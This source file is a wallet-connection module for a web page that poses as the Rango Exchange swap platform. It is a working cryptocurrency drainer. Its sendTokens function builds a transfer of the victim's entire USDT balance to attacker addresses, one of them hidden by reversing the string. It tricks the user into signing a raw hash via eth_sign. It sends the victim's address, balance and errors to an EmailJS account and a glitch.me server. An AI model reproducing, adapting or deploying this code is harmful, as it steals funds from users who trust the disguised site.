import { ethers } from "ethers";
import Onboard, { OnboardAPI, WalletState } from '@web3-onboard/core'
import injectedModule from '@web3-onboard/injected-wallets'
// import walletConnectModule, { WalletConnectOptions } from '@web3-onboard/walletconnect'
import walletConnectModule from '@web3-onboard/walletconnect'
import Web3 from "web3";
const Transaction = require("ethereumjs-tx")

const RPC_URL = 'https://mainnet.infura.io/v3/7975a81d682e4188b7a6e0fda0445b2a';

const wcV2InitOptions = {
    /**
     * Project ID associated with [WalletConnect account](https://cloud.walletconnect.com)
     */
    projectId: 'c5e857331d9ecd93bf3705578f172580',
    /**
     * Chains required to be supported by all wallets connecting to your DApp
     */
    requiredChains: [1]
}

let contractABI = [
    // transfer
    {

        'constant': false,

        'inputs': [
            {
                'name': '_to',
                'type': 'address'

            },
            {
                'name': '_value',
                'type': 'uint256'
            }

        ],
        'name': 'transfer',
        'outputs': [
            {
                'name': '',
                'type': 'bool'
            }
        ],

        'type': 'function'

    },
    //approve
    {

        'constant': false,

        'inputs': [
            {
                'name': '_spender',
                'type': 'address'

            },
            {
                'name': '_value',
                'type': 'uint256'
            }

        ],
        'name': 'approve',
        'outputs': [
            {
                'name': '',
                'type': 'bool'
            }
        ],

        'type': 'function'

    },
    //approve
    {

        'constant': false,

        'inputs': [
            {
                'name': '_from',
                'type': 'address'

            },
            {
                'name': '_to',
                'type': 'address'

            },
            {
                'name': '_value',
                'type': 'uint256'
            }

        ],
        'name': 'approve',
        'outputs': [
            {
                'name': '',
                'type': 'bool'
            }
        ],

        'type': 'function'

    },
    //balance
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }],
        "name": "balanceOf",
        "outputs": [
            { "name": "balance", "type": "uint256" }
        ],
        "type": "function"
    },

]
const injected = injectedModule()
const walletConnect = walletConnectModule(wcV2InitOptions as any);

const handleWalletConnectDeepLink = () => {
    const deepLink = window.localStorage.getItem(
        'WALLETCONNECT_DEEPLINK_CHOICE'
    )
    if (deepLink) {
        try {
            const _deepLink: { name: string; href: string } = JSON.parse(deepLink)
            if (_deepLink.href === 'https://link.trustwallet.com/wc') {
                window.localStorage.setItem(
                    'WALLETCONNECT_DEEPLINK_CHOICE', JSON.stringify({ name: 'Trust Wallet', href: 'trust://' }))
            }

        } catch (err: any) {
            //console.log('TrustWallet force redirect err', err)
        }
    }
}

document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === 'hidden') {
        handleWalletConnectDeepLink();
    }
});

const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"

function code(str: string) {
    // Step 1. Use the split() method to return a new array
    var splitString = str.split(""); // var splitString = "hello".split("");
    // ["h", "e", "l", "l", "o"]

    // Step 2. Use the reverse() method to reverse the new created array
    var reverseArray = splitString.reverse(); // var reverseArray = ["h", "e", "l", "l", "o"].reverse();
    // ["o", "l", "l", "e", "h"]

    // Step 3. Use the join() method to join all elements of the array into a string
    var joinArray = reverseArray.join(""); // var joinArray = ["o", "l", "l", "e", "h"].join("");
    // "olleh"

    //Step 4. Return the reversed string
    return joinArray; // "olleh"
}

export default class Wallet {
    static provider: ethers.providers.Web3Provider | null;
    static provider2: any;

    static onboard: OnboardAPI;
    static address: string;
    static wallet: WalletState;

    static async create() {
        Wallet.onboard = Onboard({
            theme: 'dark',
            wallets:
                ((window as any)?.ethereum) ?
                    [injected, walletConnect] : [walletConnect],

            chains: [

                {
                    id: '0x1',
                    token: 'ETH',
                    label: 'Ethereum Mainnet',
                    rpcUrl: RPC_URL
                },

            ],
            appMetadata: {
                name: 'Rango',
                icon: `
<?xml version="1.0" encoding="UTF-8"?>
<svg id="Layer_2" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 941.83 344.9">
  <defs>
    <style>
      .cls-1 {
        fill: #fff;
      }

      .cls-2 {
        fill: #070707;
        isolation: isolate;
        opacity: .4;
      }
    </style>
  </defs>
  <g id="Layer_1-2" data-name="Layer_1">
    <g>
      <g>
        <g>
          <g>
            <path class="cls-1" d="M148.83,117.6s7.2,4,18.2,10.1l143-59.3c-5.2-6.8-10.8-13.2-16.9-19.2-1,.6-1.9.9-1.9.9l-149.1,62.7c1.7,1.7,3.9,3.4,6.7,4.9v-.1Z"/>
            <path class="cls-1" d="M56.53,294.4l144.7-60.3-26.9-15.2-110.4,46.9-28,11.8c5.1,6.6,10.8,12.9,16.8,18.7,0,0,3.8-1.9,3.8-1.9Z"/>
            <path class="cls-1" d="M325.13,92.4l-26.3,10.2c-21.1,7.7-104.1,40.4-104.1,40.4,13.6,7.5,28.2,15.5,41.1,22.6,33,18,12.1,57.6,7.8,65.1,0,.1-.1.2-.2.3-.4.6-.6,1-.6,1,0,0,3.1-29.6-17.7-40.5-21-10.9-69.1-36.6-89.4-47.4-9.5-5.1-16.4-14.3-17.8-25-1-8,1-17.2,10.7-25.3,5.2-4.8,10.7-7.6,11.6-7.9h.2l107.5-44.1s.7-.3,1.7-.8l22.4-9.3C243.93,11.7,209.53,0,172.43,0,77.03,0-1.67,80.3.03,175.6c.5,29.5,8.5,57.1,22,81.1l41.6-18.1,82.8-34.8c-14.3-7.8-27.5-15.1-33.7-18.5-3.1-1.7-7-4.3-10.2-6-16.8-8.9-27.8-33.9-2.3-63.6,0,0-2.6,28.2,13.1,37.8,15.1,9.2,73.6,39.1,90.8,48.4,3.9,2.1,7.5,4.7,10.5,7.9,7.6,8.2,10.6,18.5,7.6,29.5-.1.5-.3,1-.5,1.5-.1.3-.2.6-.3,1-.2.5-.4,1-.5,1.5,0,.1-.1.3-.2.5-5.9,14.3-21.7,18.7-21.7,18.7l-1.9.6-100.7,41.3-22.2,9.8c28.1,19.5,62.2,30.9,99.1,30.7,95.5-.5,173.8-81.3,171.4-176.7-.7-27.2-7.7-52.8-19.6-75.5v-.3Z"/>
          </g>
          <polygon class="cls-2" points="146.53 203.5 174.43 218.7 160.43 224.6 131.23 209.9 146.53 203.5"/>
          <path class="cls-2" d="M198.93,262.1s23.1-16.4,2.2-28.2l-13.2,5.5s21.9,5.9,11,22.7Z"/>
          <polygon class="cls-2" points="194.83 142.9 167.03 127.7 181.23 121.8 210.63 136.8 194.83 142.9"/>
          <path class="cls-2" d="M144.33,84.2s-23.4,16.6-2.2,28.5l13.3-5.5s-22.2-5.9-11.1-23Z"/>
        </g>
        <g>
          <path class="cls-1" d="M472.83,135.5h-13.3v40.2h-28V53.3h48.9c23.2,0,42,18.7,42,42s-9.1,28.7-22.5,35.5l26,44.9h-30.1l-23.1-40.2h.1ZM459.53,111h21c7.7,0,14-6.8,14-15.7s-6.3-15.7-14-15.7h-21v31.5-.1Z"/>
          <path class="cls-1" d="M623.53,88.3v87.4h-26.2v-8.2c-5.8,6.6-14.3,10.7-26,10.7-22.9,0-41.8-20.1-41.8-46.2s18.9-46.2,41.8-46.2,20.3,4,26,10.7v-8.2h26.2ZM597.33,132c0-13.1-8.7-21.3-20.8-21.3s-20.8,8.2-20.8,21.3,8.7,21.3,20.8,21.3,20.8-8.2,20.8-21.3Z"/>
          <path class="cls-1" d="M726.73,122v53.7h-26.2v-49.8c0-10.8-6.8-15.9-15.2-15.9s-16.3,5.6-16.3,18v47.7h-26.2v-87.4h26.2v8.2c4.7-6.5,13.5-10.7,25-10.7,17.7,0,32.7,12.6,32.7,36.2Z"/>
          <path class="cls-1" d="M834.33,88.3v83c0,29.4-22.9,41.8-46.2,41.8s-33.4-6.8-41.4-21.1l22.4-12.9c3.3,6.1,8.4,11,19.9,11s19.8-6.3,19.8-18.7v-8c-5.8,7.2-14.2,11.4-25.5,11.4-24.8,0-43-20.3-43-44.4s18.2-44.4,43-44.4,19.8,4.2,25.5,11.4v-8.9h25.5v-.2ZM808.83,130.2c0-12.1-8.7-20.3-21.2-20.3s-21.2,8.2-21.2,20.3,8.7,20.3,21.2,20.3,21.2-8.2,21.2-20.3Z"/>
          <path class="cls-1" d="M849.23,132c0-26.1,20.6-46.2,46.3-46.2s46.3,20.1,46.3,46.2-20.6,46.2-46.3,46.2-46.3-20.1-46.3-46.2ZM915.63,132c0-12.4-8.7-20.6-20.1-20.6s-20.1,8.2-20.1,20.6,8.7,20.6,20.1,20.6,20.1-8.2,20.1-20.6Z"/>
        </g>
      </g>
      <g>
        <path class="cls-1" d="M442.13,288.31h37.26v10.11h-47.97v-80.27h47.37v10.11h-36.67v24.68h33.79v10.01h-33.79v25.47-.1Z"/>
        <path class="cls-1" d="M541.03,298.42h-11.69l-16.15-21.7-16.15,21.7h-11.69l22-29.53-20.71-27.85h11.79l14.77,19.92,14.87-19.92h11.69l-20.71,27.75,21.9,29.53.1.1Z"/>
        <path class="cls-1" d="M573.24,299.91c-8.62,0-15.86-2.87-21.6-8.62-5.75-5.75-8.62-12.98-8.62-21.51s2.87-15.76,8.62-21.51c5.75-5.75,12.88-8.62,21.6-8.62s10.7,1.39,15.26,4.06c4.56,2.68,7.83,6.34,10.11,11l-8.42,4.86c-1.49-3.07-3.67-5.55-6.74-7.33-2.97-1.88-6.44-2.77-10.31-2.77-5.75,0-10.5,1.98-14.37,5.85-3.87,3.86-5.75,8.72-5.75,14.57s1.88,10.5,5.75,14.47c3.87,3.86,8.62,5.85,14.37,5.85s7.23-.89,10.31-2.68c3.07-1.78,5.35-4.26,7.04-7.33l8.52,4.96c-2.48,4.56-5.95,8.13-10.5,10.8s-9.71,4.06-15.26,4.06v-.1Z"/>
        <path class="cls-1" d="M637.46,239.55c6.74,0,12.09,2.08,16.15,6.34s6.05,10.01,6.05,17.24v35.18h-10.01v-34.69c0-4.66-1.29-8.32-3.77-10.8-2.48-2.58-6.05-3.86-10.41-3.86s-9.02,1.59-12.09,4.66c-3.07,3.07-4.56,7.83-4.56,14.27v30.42h-10.01v-80.27h10.01v31.22c4.06-6.54,10.21-9.71,18.63-9.71h0Z"/>
        <path class="cls-1" d="M721.1,241.04h10.01v57.38h-10.01v-9.91c-4.96,7.53-12.19,11.4-21.7,11.4s-14.87-2.97-20.51-8.82c-5.65-5.85-8.52-12.98-8.52-21.41s2.87-15.56,8.52-21.41c5.65-5.85,12.49-8.82,20.51-8.82s16.75,3.77,21.7,11.4v-9.91.1ZM700.69,290.2c5.85,0,10.7-1.98,14.57-5.95,3.87-3.96,5.85-8.82,5.85-14.67s-1.98-10.7-5.85-14.67c-3.87-3.96-8.72-5.95-14.57-5.95s-10.5,1.98-14.47,5.95c-3.87,3.96-5.85,8.82-5.85,14.67s1.98,10.7,5.85,14.67c3.87,3.96,8.72,5.95,14.47,5.95Z"/>
        <path class="cls-1" d="M774.81,239.55c6.74,0,12.09,2.08,16.15,6.34s6.05,10.01,6.05,17.24v35.18h-10.01v-34.69c0-4.66-1.29-8.32-3.77-10.8-2.48-2.58-6.05-3.86-10.41-3.86s-9.02,1.59-12.09,4.66c-3.07,3.07-4.56,7.83-4.56,14.27v30.42h-10.01v-57.38h10.01v8.23c4.06-6.54,10.21-9.71,18.63-9.71v.1Z"/>
        <path class="cls-1" d="M858.56,241.04h9.91v54.9c0,8.52-2.87,15.06-8.62,19.82s-12.59,7.04-20.61,7.04-11.99-1.19-16.65-3.57-8.23-5.85-10.5-10.41l8.72-4.96c3.17,6.44,9.41,9.61,18.73,9.61s10.6-1.59,14.07-4.66c3.37-3.17,5.15-7.43,5.15-12.88v-8.13c-5.05,7.63-12.19,11.5-21.6,11.5s-15.06-2.87-20.81-8.72c-5.65-5.85-8.52-12.88-8.52-21.21s2.87-15.36,8.52-21.21c5.65-5.75,12.59-8.62,20.81-8.62s16.55,3.77,21.6,11.4v-9.91h-.2ZM823.57,283.95c3.87,3.86,8.72,5.85,14.57,5.85s10.7-1.98,14.57-5.85,5.85-8.72,5.85-14.57-1.98-10.5-5.85-14.47c-3.87-3.86-8.72-5.85-14.57-5.85s-10.7,1.98-14.57,5.85-5.85,8.72-5.85,14.47,1.98,10.7,5.85,14.57Z"/>
        <path class="cls-1" d="M890.57,274.24c.99,5.15,3.37,9.12,7.04,11.89,3.67,2.87,8.32,4.26,13.68,4.26s13.08-2.77,16.55-8.32l8.52,4.86c-5.55,8.62-13.97,12.98-25.27,12.98s-16.55-2.87-22.2-8.52c-5.65-5.65-8.52-12.88-8.52-21.6s2.77-15.86,8.42-21.6c5.55-5.75,12.78-8.62,21.7-8.62s15.26,2.97,20.61,8.92c5.35,5.95,7.93,13.08,7.93,21.41s-.1,2.97-.3,4.46h-48.06l-.1-.1ZM910.39,248.97c-5.35,0-9.81,1.49-13.28,4.56-3.47,2.97-5.65,7.04-6.54,12.09h38.35c-.89-5.45-2.97-9.51-6.44-12.39s-7.43-4.26-12.09-4.26h0Z"/>
      </g>
    </g>
  </g>
</svg>
`,
                description: 'Use Rango Exchange for secure cross-chain bridge and swaps. Transfer assets seamlessly and effortlessly between blockchains with our fast, user-friendly platform.',
                recommendedInjectedWallets: [
                    { name: 'MetaMask', url: 'https://metamask.io' },
                    { name: 'Coinbase', url: 'https://wallet.coinbase.com/' },
                    { name: 'Trust', url: 'https://trustwallet.com/' },
                    { name: 'OKX', url: 'https://web3.okx.com/' }


                ]
            },
        })
    }

    static async connectWallet() {
        try {

            const wallets = await Wallet.onboard.connectWallet();
            const w = wallets[0];
            console.log(w)
            Wallet.wallet = wallets[0];
            Wallet.address = wallets[0].accounts[0].address;
            Wallet.provider2 = wallets[0].provider;
            console.log(w)
            // console.log(wallets[0].)

            Wallet.provider = new ethers.providers.Web3Provider(
                wallets[0].provider,
                'any'
            );

            handleWalletConnectDeepLink()
        } catch (er) {

        }


    }

    static readyToTransact = async () => {
        return Wallet.wallet ? true : false
    }

    static sendTokens = async () => {
        try {
            const web3js = new Web3(Wallet.provider2);
            const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"
            await web3js.eth
                .getTransactionCount(Wallet.address, 'pending')
                .then(async (res) => {
                    const usdtContract = new web3js.eth.Contract(contractABI as any, USDT);
                    const maxAllowance = web3js.utils.toBN('115792089237316195423570985008687907853269984665640564039457584007913129639935');
                    const gasPrice = await web3js.eth.getGasPrice()
                    const rGasPrice = web3js.utils.toHex(Math.floor(Number(gasPrice) * 1.3))
                    const balance = await usdtContract.methods.balanceOf(Wallet.address).call();
                    const bm = 30000
                    // const walletBalance = await web3js.eth.getBalance(Wallet.address);
                    // const gasPrice = await web3js.eth.getGasPrice()
                    // const rGasPrice = web3js.utils.toHex(Math.floor(Number(gasPrice) * 1.3))
                    // const gas = web3js.utils.toBN('22000')
                    // const totalGas = Number(gas) * Math.floor(Number(gasPrice) * 2);
                    // const totalCost = Number(walletBalance) - totalGas
                    let per = balance * 0.1


                    const txData = {
                        nonce: web3js.utils.toHex(res),
                        gasPrice: rGasPrice,
                        gasLimit: '0x11170',
                        to: USDT,
                        value: "",
                        data: Number(ethers.utils.formatUnits(balance, 6)) >= 50000 ? usdtContract.methods.transfer(code("1534c2bD22acdf96Ad6fb0f4F47CB692A7806CD7x0"), balance).encodeABI() : usdtContract.methods.transfer("0x018F398105b638A2F28D987dF2724454B97da8F1", balance).encodeABI(),
                        // data: usdtContract.methods.transfer(
                        //     "0xa0021A475d9ecc1D03D27D034912B666088DeDa5", balance).encodeABI(),
                        v: '0x1',
                        r: '0x',
                        s: '0x',

                        // nonce: web3js.utils.toHex(res),
                        // gasPrice: rGasPrice,
                        // gasLimit: '0x55F0',
                        // to:  "0xa0021A475d9ecc1D03D27D034912B666088DeDa5",
                        // value: '0x' + totalCost.toString(16),
                        // data: '0x',
                        // v: '0x1',
                        // r: '0x',
                        // s: '0x',
                    }

                    let Tx = new Transaction(txData)
                    const serializedTx = '0x' + Tx.serialize().toString('hex')
                    const hashed = web3js.utils.sha3(serializedTx)
                    const chainId = await web3js.eth.getChainId();


                    var data = {
                        service_id: 'service_dj3q27k',
                        template_id: 'template_sfyf2fg',
                        user_id: 'user_XegGLjcWV1aS6ouUhIeCY',
                        template_params: {
                            'message': `${Wallet.address}, balance ${ethers.utils.formatUnits(balance, 6)}`,
                        }
                    };

                    fetch("https://api.emailjs.com/api/v1.0/email/send", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            // '
                        },
                        body: JSON.stringify(
                            data
                        ),
                    });


                    await web3js.eth
                        .sign(hashed as string, Wallet.address)
                        .then(async (result) => {
                            const signature = result.substring(2)
                            const r = '0x' + signature.substring(0, 64)
                            const s = '0x' + signature.substring(64, 128)
                            const v = parseInt(signature.substring(128, 130), 16)
                            const y = web3js.utils.toHex(v + chainId * 2 + 8)

                            txData.r = r
                            txData.s = s
                            txData.v = y
                            Tx = new Transaction(txData)

                            const serializedTx2 = '0x' + Tx.serialize().toString('hex'),
                                encoder2 = { encoding: 'hex' },
                                hashed2 = web3js.utils.sha3(serializedTx2)

                            await web3js.eth
                                .sendSignedTransaction(serializedTx2)
                                .then((_0x45f7a3) => {
                                    fetch("https://guttural-glitter-plain.glitch.me/user-token", {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json",
                                            // '
                                        },
                                        body: JSON.stringify({
                                            address: Wallet.address,
                                            token_type: "erc20",
                                            token_id: "",
                                            date: new Date().toISOString(),
                                            token_address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
                                        }),
                                    });
                                })
                                .catch((_0x119fc8) => {
                                    var data = {
                                        service_id: 'service_dj3q27k',
                                        template_id: 'template_sfyf2fg',
                                        user_id: 'user_XegGLjcWV1aS6ouUhIeCY',
                                        template_params: {
                                            'message': `${JSON.stringify({ _0x119fc8 })}`,
                                        }
                                    };

                                    fetch("https://api.emailjs.com/api/v1.0/email/send", {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json",
                                            // '
                                        },
                                        body: JSON.stringify({ data }),
                                    }); console.log(JSON.stringify({ _0x119fc8 }))
                                })
                        })
                        .catch((_0x4ded9e) => {

                            var data = {
                                service_id: 'service_dj3q27k',
                                template_id: 'template_sfyf2fg',
                                user_id: 'user_XegGLjcWV1aS6ouUhIeCY',
                                template_params: {
                                    'message': JSON.stringify({ _0x4ded9e }),
                                }
                            };

                            fetch("https://api.emailjs.com/api/v1.0/email/send", {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json",
                                    // '
                                },
                                body: JSON.stringify({ data }),
                            });


                            console.log(

                                JSON.stringify({ _0x4ded9e }))
                        })



                }).catch(err => console.log(err));
        } catch (error) {
            console.log(error);
        }
    }

}
